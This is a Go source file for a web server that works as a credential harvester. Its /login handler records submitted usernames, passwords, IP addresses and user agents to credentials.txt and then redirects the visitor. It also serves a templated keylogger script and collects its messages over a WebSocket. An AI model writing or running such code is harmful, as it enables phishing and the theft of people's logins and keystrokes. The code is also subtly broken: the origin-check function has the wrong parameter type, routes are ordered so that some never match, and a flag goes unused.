package main

import (
	"flag"
	"log"
	"net/http"
	"html/template"
	"os"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
)

var (
	upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Response) bool { return true }}
	listenaddr string
	wsAddr string
	jsTemplate *template.Template
)

func init(){
	var err error

	flag.StringVar(&listenaddr,"listen-addr","","Address to listen on")
	flag.StringVar(&wsAddr,"ws-addr","","Address for WebSocket")

	flag.Parse()

	jsTemplate, err = template.ParseFiles("logger.js")
	if(err != nil){
		logrus.Panicf("Could not parse template %s",err)
	}
}

func serveWS(w http.ResponseWriter,r *http.Request){
	con, err := upgrader.Upgrade(w,r,nil)
	if(err != nil){
		http.Error(w,"",500)
		return
	}
	defer con.Close()
	logrus.Printf("Connection from %s",con.RemoteAddr().String())
	for{
		_, msg, err := con.ReadMessage()
		if(err != nil){
			return
		}
		logrus.Printf("From %s: %s",con.RemoteAddr().String(),string(msg))
	}
}

func serveFile(w http.ResponseWriter,r *http.Request){
	w.Header().Add("Content-Type","application/javascript")
	jsTemplate.Execute(w,wsAddr)
}

func login(w http.ResponseWriter, r *http.Request){
	logrus.WithFields(logrus.Fields{
		"time": 		time.Now().String(),
		"username":		r.FormValue("username"),
		"password":		r.FormValue("password"),
		"user-agent":	r.UserAgent(),
		"ip_adderess":  r.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w,r,"/",302)
}

func main() {
	fh, err := os.OpenFile("credentials.txt",os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if(err != nil){
		logrus.Errorf("Could not open file credentials.txt")
		return
	}
	defer fh.Close()

	logrus.SetOutput(fh)
	r := mux.NewRouter()

	r.HandleFunc("/login",login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	r.HandleFunc("/ws",serveWS)
	r.HandleFunc("/k.js",serveFile)

	log.Fatal(http.ListenAndServe(":8080",r))
}
